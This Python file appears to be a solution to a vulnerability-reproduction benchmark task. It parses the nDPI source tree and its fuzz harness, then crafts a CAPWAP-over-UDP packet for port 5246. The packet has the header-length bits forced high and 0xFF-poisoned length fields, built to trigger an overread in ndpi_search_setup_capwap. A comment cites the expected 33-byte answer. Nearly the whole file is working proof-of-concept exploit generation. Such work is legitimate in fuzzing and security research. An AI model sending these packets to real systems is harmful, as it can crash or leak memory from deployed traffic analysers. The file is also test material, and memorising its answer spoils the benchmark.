import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _iter_source_texts_from_tar(tar_path: str) -> Iterable[Tuple[str, str]]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                low = name.lower()
                if not (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".h") or low.endswith(".hpp")):
                    continue
                if m.size > 5_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                yield name, text
    except Exception:
        return


def _iter_source_texts_from_dir(root: str) -> Iterable[Tuple[str, str]]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            low = fn.lower()
            if not (low.endswith(".c") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".h") or low.endswith(".hpp")):
                continue
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
                if st.st_size > 5_000_000:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                continue
            yield path, text


def _iter_source_texts(src_path: str) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        yield from _iter_source_texts_from_dir(src_path)
    else:
        yield from _iter_source_texts_from_tar(src_path)


def _extract_function_body(text: str, func_name: str) -> Optional[str]:
    m = re.search(r"\b" + re.escape(func_name) + r"\s*\(", text)
    if not m:
        return None
    i = m.start()
    brace = text.find("{", m.end())
    if brace < 0:
        return None
    depth = 0
    j = brace
    n = len(text)
    while j < n:
        ch = text[j]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return text[brace : j + 1]
        j += 1
    return None


def _max_required_payload_len_from_checks(func_body: str) -> int:
    req = 0
    patterns = [
        r"payload_packet_len\s*<\s*(\d+)",
        r"payload_packet_len\s*<=\s*(\d+)",
        r"packet->payload_packet_len\s*<\s*(\d+)",
        r"packet->payload_packet_len\s*<=\s*(\d+)",
    ]
    for pat in patterns:
        for m in re.finditer(pat, func_body):
            try:
                val = int(m.group(1))
            except Exception:
                continue
            if "<=" in pat:
                val += 1
            req = max(req, val)
    return req


def _infer_harness_payload_offset_and_endianness(harness_text: str) -> Tuple[Optional[int], str, bool]:
    # Returns (payload_offset, endian_for_ports, is_raw_packet)
    ht = harness_text

    raw_indicators = [
        "struct ether_header",
        "ETH_P_IP",
        "pcap_pkthdr",
        "pcap_",
        "ndpi_workflow_process_packet",
        "NDPI_PROTOCOL_IPV4",
        "NDPI_PROTOCOL_ETHERNET",
    ]
    is_raw_packet = any(s in ht for s in raw_indicators)

    payload_offset = None
    m = re.search(r"\bpayload\s*=\s*(?:\(const\s+)?(?:u?int8_t|unsigned\s+char|char)\s*\*\s*\)\s*data\s*\+\s*(\d+)", ht)
    if not m:
        m = re.search(r"\bpayload\s*=\s*data\s*\+\s*(\d+)", ht)
    if not m:
        m = re.search(r"\bconst\s+uint8_t\s*\*\s*payload\s*=\s*data\s*\+\s*(\d+)", ht)
    if m:
        try:
            payload_offset = int(m.group(1))
        except Exception:
            payload_offset = None
    else:
        # Sometimes: data += N; size -= N;
        m = re.search(r"\bdata\s*\+=\s*(\d+)\s*;", ht)
        if m:
            try:
                payload_offset = int(m.group(1))
            except Exception:
                payload_offset = None

    endian = "big"
    # Heuristic based on shifts for 16-bit extraction.
    # big endian: (data[0] << 8) | data[1]
    # little endian: data[0] | (data[1] << 8)
    if re.search(r"data\[\s*0\s*\]\s*<<\s*8", ht) or re.search(r"data\[\s*2\s*\]\s*<<\s*8", ht):
        endian = "big"
    elif re.search(r"data\[\s*1\s*\]\s*<<\s*8", ht) or re.search(r"data\[\s*3\s*\]\s*<<\s*8", ht):
        endian = "little"
    elif "ntohs" in ht:
        endian = "big"

    has_ports = ("sport" in ht and "dport" in ht) or ("src_port" in ht and "dst_port" in ht) or ("source_port" in ht and "dest_port" in ht)
    return payload_offset, endian, is_raw_packet or not has_ports


def _ip_checksum(header: bytes) -> int:
    if len(header) % 2 == 1:
        header += b"\x00"
    s = 0
    for i in range(0, len(header), 2):
        s += (header[i] << 8) + header[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _build_ipv4_udp_ethernet_frame(payload: bytes, sport: int, dport: int) -> bytes:
    eth = b"\x00\x00\x00\x00\x00\x00" + b"\x00\x00\x00\x00\x00\x00" + b"\x08\x00"
    ver_ihl = 0x45
    tos = 0
    total_length = 20 + 8 + len(payload)
    identification = 0
    flags_frag = 0
    ttl = 64
    proto = 17
    checksum = 0
    src_ip = b"\x01\x01\x01\x01"
    dst_ip = b"\x02\x02\x02\x02"
    iphdr = bytes([
        ver_ihl, tos,
        (total_length >> 8) & 0xFF, total_length & 0xFF,
        (identification >> 8) & 0xFF, identification & 0xFF,
        (flags_frag >> 8) & 0xFF, flags_frag & 0xFF,
        ttl, proto,
        0, 0
    ]) + src_ip + dst_ip
    csum = _ip_checksum(iphdr)
    iphdr = iphdr[:10] + bytes([(csum >> 8) & 0xFF, csum & 0xFF]) + iphdr[12:]

    udp_len = 8 + len(payload)
    udphdr = bytes([
        (sport >> 8) & 0xFF, sport & 0xFF,
        (dport >> 8) & 0xFF, dport & 0xFF,
        (udp_len >> 8) & 0xFF, udp_len & 0xFF,
        0, 0
    ])
    return eth + iphdr + udphdr + payload


def _find_relevant_sources(src_path: str) -> Tuple[Optional[str], Optional[str]]:
    harness_text = None
    capwap_func_body = None

    for _, text in _iter_source_texts(src_path):
        if harness_text is None and "LLVMFuzzerTestOneInput" in text:
            harness_text = text
        if capwap_func_body is None and "ndpi_search_setup_capwap" in text:
            body = _extract_function_body(text, "ndpi_search_setup_capwap")
            if body:
                capwap_func_body = body
        if harness_text is not None and capwap_func_body is not None:
            break

    return harness_text, capwap_func_body


def _apply_length_field_poisoning(payload: bytearray, capwap_body: Optional[str]) -> None:
    if not capwap_body:
        return

    # Set common 16/32-bit length fields read from packet->payload[...] to large values if within bounds.
    # This increases chances of triggering an overread in vulnerable parsing.
    # Keep it conservative: only affect offsets >= 2 to avoid breaking simple signature checks.
    u16_offsets = set()
    u32_offsets = set()

    for m in re.finditer(r"ntohs\s*\(\s*\*\s*\(\s*(?:u_?int16_t|uint16_t)\s*\*\s*\)\s*&\s*packet->payload\s*\[\s*(\d+)\s*\]\s*\)", capwap_body):
        try:
            u16_offsets.add(int(m.group(1)))
        except Exception:
            pass
    for m in re.finditer(r"ntohl\s*\(\s*\*\s*\(\s*(?:u_?int32_t|uint32_t)\s*\*\s*\)\s*&\s*packet->payload\s*\[\s*(\d+)\s*\]\s*\)", capwap_body):
        try:
            u32_offsets.add(int(m.group(1)))
        except Exception:
            pass
    for m in re.finditer(r"get_u_int16_t\s*\(\s*&\s*packet->payload\s*\[\s*(\d+)\s*\]\s*\)", capwap_body):
        try:
            u16_offsets.add(int(m.group(1)))
        except Exception:
            pass
    for m in re.finditer(r"get_u_int32_t\s*\(\s*&\s*packet->payload\s*\[\s*(\d+)\s*\]\s*\)", capwap_body):
        try:
            u32_offsets.add(int(m.group(1)))
        except Exception:
            pass

    for off in sorted(u16_offsets):
        if off >= 2 and off + 1 < len(payload):
            payload[off] = 0xFF
            payload[off + 1] = 0xFF

    for off in sorted(u32_offsets):
        if off >= 2 and off + 3 < len(payload):
            payload[off:off + 4] = b"\xFF\xFF\xFF\xFF"


class Solution:
    def solve(self, src_path: str) -> bytes:
        harness_text, capwap_body = _find_relevant_sources(src_path)

        # Determine minimum payload length needed to pass initial checks
        required_payload_len = 0
        if capwap_body:
            required_payload_len = _max_required_payload_len_from_checks(capwap_body)

        # Default toward a small but commonly sufficient payload length.
        # Ground truth is 33 bytes total; many harnesses use 4-byte port prefix => 29 payload.
        default_total_len = 33
        default_prefix_len = 4
        default_payload_len = default_total_len - default_prefix_len

        payload_offset = None
        endian = "big"
        is_raw_packet = False

        if harness_text:
            po, en, raw = _infer_harness_payload_offset_and_endianness(harness_text)
            payload_offset = po
            endian = en
            is_raw_packet = raw

        # If harness seems to use a payload offset, honor it; else assume 4-byte port prefix.
        if payload_offset is None:
            payload_offset = 4

        # If harness appears to take raw packet bytes, craft an Ethernet+IPv4+UDP frame.
        if is_raw_packet and payload_offset == 0:
            payload_len = max(required_payload_len, 8, 29)
            payload = bytearray(b"\x00" * payload_len)
            # CAPWAP-like: version 0, type 1 (control)
            payload[0] = 0x01
            # Set HLEN bits high to force large header length computations
            payload[1] = 0xF8
            _apply_length_field_poisoning(payload, capwap_body)
            return _build_ipv4_udp_ethernet_frame(bytes(payload), 5246, 5246)

        # For offset-based harnesses, craft prefix + payload.
        prefix_len = int(payload_offset)
        payload_len = max(required_payload_len, 8, default_payload_len if prefix_len == 4 else max(8, default_total_len - prefix_len))
        total_len = prefix_len + payload_len

        data = bytearray(b"\x00" * total_len)

        # If prefix_len suggests 5 bytes, assume first byte selects L4 protocol; set to UDP=17.
        if prefix_len >= 1:
            # Only set if it looks like a selector is used (common in fuzz harnesses)
            if prefix_len == 5:
                data[0] = 17

        # Place ports if prefix likely includes them.
        # Common layouts:
        #  - offset 4: [sport(2), dport(2)] then payload
        #  - offset 5: [proto(1), sport(2), dport(2)] then payload
        sport = 5246
        dport = 5246

        def put_port(off: int, port: int) -> None:
            if off < 0 or off + 2 > prefix_len:
                return
            b = port.to_bytes(2, endian)
            data[off:off + 2] = b

        if prefix_len == 4:
            put_port(0, sport)
            put_port(2, dport)
        elif prefix_len == 5:
            put_port(1, sport)
            put_port(3, dport)
        else:
            # Best-effort: place ports at the end of prefix if possible
            if prefix_len >= 4:
                put_port(prefix_len - 4, sport)
                put_port(prefix_len - 2, dport)

        payload = memoryview(data)[prefix_len:prefix_len + payload_len]
        payload[:] = b"\x00" * payload_len
        # CAPWAP-like: version 0, type 1 (control)
        if payload_len >= 1:
            payload[0] = 0x01
        if payload_len >= 2:
            payload[1] = 0xF8

        payload_ba = bytearray(payload.tobytes())
        _apply_length_field_poisoning(payload_ba, capwap_body)
        data[prefix_len:prefix_len + payload_len] = payload_ba

        return bytes(data)